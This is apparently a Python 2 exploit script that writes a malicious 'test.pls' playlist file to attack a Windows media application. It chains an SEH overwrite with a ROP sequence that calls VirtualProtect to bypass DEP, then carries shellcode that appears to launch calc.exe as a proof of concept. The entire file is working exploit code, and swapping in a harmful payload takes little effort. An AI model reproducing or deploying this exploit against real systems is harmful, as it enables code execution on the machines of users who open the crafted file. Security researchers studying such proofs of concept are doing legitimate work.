#!python

import struct

# rop
rop = ""
rop += struct.pack('<L',0x004078f6) # POP EDX # ADD EAX,4C48300 # POP ESI # RETN
rop += struct.pack('<L',0xFFFFFFFF) # Filler (compensate)
rop += struct.pack('<L',0xFFFFFFFF) # Filler (compensate)
rop += struct.pack('<L',0x00000040) # 0x40
rop += struct.pack('<L',0xFFFFFFFF) # Filler (compensate)
rop += struct.pack('<L',0x0044fe91) # POP ECX # RETN 
rop += struct.pack('<L',0x007EC070) # ptr to &VirtualProtect()
rop += struct.pack('<L',0x100021c0) # MOV EAX,DWORD PTR DS:[ECX] # RETN
rop += struct.pack('<L',0x0045109e) # XCHG EAX,ESI # RETN
rop += struct.pack('<L',0x0041ff51) # POP EBP # RETN
rop += struct.pack('<L',0x004319E6) # &JMP ESP
rop += struct.pack('<L',0x0044fe42) # POP EBX # RETN
rop += struct.pack('<L',0x00000201) # 0x201
rop += struct.pack('<L',0x10007218) # POP ECX # RETN
rop += struct.pack('<L',0x00480000) # &Writable Location
rop += struct.pack('<L',0x10008d68) # POP EDI # RETN
rop += struct.pack('<L',0x10008d69) # RETN (ROP NOP)
rop += struct.pack('<L',0x00444ad3) # POP EAX # RETN
rop += struct.pack('<L',0x90909090) # NOP
rop += struct.pack('<L',0x00443f76) # PUSHAD # RETN

# shell code
buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += "\xff\xd5\x63\x61\x6c\x63\x00"

next = struct.pack('<L', 0xFFFFFFFF)
handler = struct.pack('<L',0x004399b9)

payload ="A" * 780 + next + handler + "B" * 640 + rop + buf + "B" * 4000

f = open("test.pls", "wb")
f.write(payload[:5070])
f.close()
